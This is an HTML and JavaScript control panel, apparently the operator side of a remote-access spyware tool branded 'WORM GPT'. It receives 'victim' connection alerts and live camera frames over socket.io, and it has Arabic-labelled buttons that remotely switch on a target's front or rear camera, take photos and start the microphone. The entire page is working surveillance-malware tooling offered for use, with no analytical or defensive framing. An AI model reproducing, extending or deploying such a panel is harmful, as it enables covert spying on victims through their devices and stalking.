<!DOCTYPE html>
<html>
<head>
    <title>WORM GPT - PRO PANEL</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { background: #050505; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; margin: 0; }
        .header { background: #111; padding: 15px; border-bottom: 2px solid #ff0000; box-shadow: 0 0 15px #f00; }
        .monitor-container { width: 90%; max-width: 900px; margin: 20px auto; background: #000; border: 2px solid #333; position: relative; min-height: 500px; }
        #liveView { width: 100%; height: auto; display: block; }
        .controls { background: #111; padding: 20px; border-top: 2px solid #ff0000; position: fixed; bottom: 0; width: 100%; }
        button { background: #ff0000; color: #fff; border: none; padding: 12px 20px; margin: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; border-radius: 5px; }
        button:hover { background: #fff; color: #f00; box-shadow: 0 0 10px #fff; }
        .status-bar { color: #0f0; margin: 10px; font-size: 1.1em; }
    </style>
</head>
<body>
    <div class="header">
        <h2>WORM GPT REMOTE CONTROL (v3.0)</h2>
        <div id="target" class="status-bar">Target: Waiting for Connection...</div>
    </div>

    <div class="monitor-container">
        <img id="liveView" src="" alt="[ STREAM OFFLINE ]">
    </div>

    <div class="controls">
        <button onclick="send('start_camera_back')">الكاميرا الخلفية 📸</button>
        <button onclick="send('start_camera_front')">الكاميرا الأمامية 🤳</button>
        <button onclick="send('take_photo')">التقاط صورة 🖼️</button>
        <button onclick="send('start_audio')">الميكروفون 🎙️</button>
        <button onclick="location.reload()">إيقاف / تحديث 🛑</button>
    </div>

    <script>
        const socket = io();
        const view = document.getElementById('liveView');

        socket.on('new_victim_alert', d => {
            document.getElementById('target').innerText = "Target Online: " + d.model;
        });

        // استقبال الفيديو السلس
        socket.on('display_frame', d => {
            view.src = "data:image/jpeg;base64," + d.frame;
        });

        // استقبال الصور الملتقطة
        socket.on('display_photo', d => {
            view.src = "data:image/jpeg;base64," + d.img;
            alert("تم التقاط صورة من الهدف!");
        });

        function send(cmd) {
            socket.emit('admin_command', { command: cmd });
        }
    </script>
</body>
</html>
